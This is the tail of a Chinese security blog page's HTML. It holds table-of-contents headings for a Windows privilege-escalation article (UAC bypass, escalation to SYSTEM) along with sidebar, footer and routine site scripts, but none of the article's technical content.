href="#%E9%98%B6%E6%AE%B5-2%EF%BC%9AUAC-%E7%BB%95%E8%BF%87%E6%A8%A1%E5%9D%97%E9%85%8D%E7%BD%AE%E5%B9%B6%E6%89%A7%E8%A1%8C"><span class="toc-text">阶段 2：UAC 绕过模块配置并执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-3%EF%BC%9A%E6%9C%80%E7%BB%88%E6%8F%90%E6%9D%83%E8%87%B3-SYSTEM-%E6%9D%83%E9%99%90%E9%AA%8C%E8%AF%81"><span class="toc-text">阶段 3：最终提权至 SYSTEM + 权限验证</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%B8%A4%E7%A7%8D%E6%8F%90%E6%9D%83%E8%B7%AF%E7%BA%BF"><span class="toc-text">5. 两种提权路线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%E4%B8%8E%E4%BC%98%E5%85%88%E7%BA%A7"><span class="toc-text">方法总结与优先级</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/13/Windows-%E6%8F%90%E6%9D%83/index/" title="Windows 提权">Windows 提权</a><time datetime="2026-08-13T08:00:00.000Z" title="发表于 2026-08-13 16:00:00">2026-08-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/13/CCF-2026/index/" title="CCF 2026.6">CCF 2026.6</a><time datetime="2026-08-13T06:00:00.000Z" title="发表于 2026-08-13 14:00:00">2026-08-13</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Jasmine_Iris</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.9/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: 'https://waline.jasmine-iris.top',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client@3.8.0/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client@3.8.0/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline }
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !false) {
+    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><script>if(document.getElementById("page-header")&&document.getElementById("page-header").classList.contains("full_page")){var bg=document.getElementById("web_bg");if(bg)bg.style.backgroundImage="url(/img/home-bg.png)";}</script><script>document.documentElement.classList.add(GLOBAL_CONFIG.pageType==='home'?'is-home':'not-home');(function(){if(GLOBAL_CONFIG.pageType!=='home')return;var t=sessionStorage.getItem('auto-scrolled');if(t)return;sessionStorage.setItem('auto-scrolled','1');setTimeout(function(){var el=document.getElementById('content-inner');if(el)btf.scrollToDest(el.offsetTop,600)},1500)})()</script><script>(function(){document.addEventListener('click',function(e){if(e.target.closest('.card-tag-cloud a, .article-tag-list a, .site-data a[href="/tags/"]')){e.preventDefault()}})})()</script><script src="/js/copy-guard.js"></script><script>(function(){var bg=document.getElementById('web_bg');if(!bg)return;bg.style.backgroundSize='70%';bg.style.backgroundPosition='left bottom';var p=location.pathname;var bw=document.getElementById('body-wrap');if(p==='/archives/'&&bw){bw.classList.add('page-custom-style')}})()</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
